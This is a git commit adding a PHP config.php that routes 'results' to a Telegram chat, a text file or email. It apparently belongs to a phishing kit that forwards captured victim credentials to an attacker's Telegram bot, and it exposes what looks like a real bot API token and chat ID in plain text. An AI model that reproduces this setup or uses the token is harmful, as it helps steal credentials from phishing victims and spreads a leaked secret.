cc204416f6206745e2e8a9cfc101ff0aaadf0dcc
Crash213bed <167933306+Crash213bed@users.noreply.github.com>
2024-11-22 12:44:38 +0000

    Add files via upload

---
+++ config.php
@@ -0,0 +1,11 @@
+<?php
+
+
+$saveintotxt = "no"; // If you want to save in txt file put yes otherwise put no
+$sendtotelegram = "yes"; // If You Want to result on Telegram put yes otherwise put no
+$chat_id = "1722250078"; // Your Telegram Chat ID
+$bot_url = "7144792402:AAH-6HPuQyk2bZrWQXxj1r7rYvRYlFNToC4"; // Your Telegram Bot API Key
+$sendtoemail = "no"; // If you want to result on Email put yes otherwise put no
+$email = ""; // Your Email Here :)
+
+?>
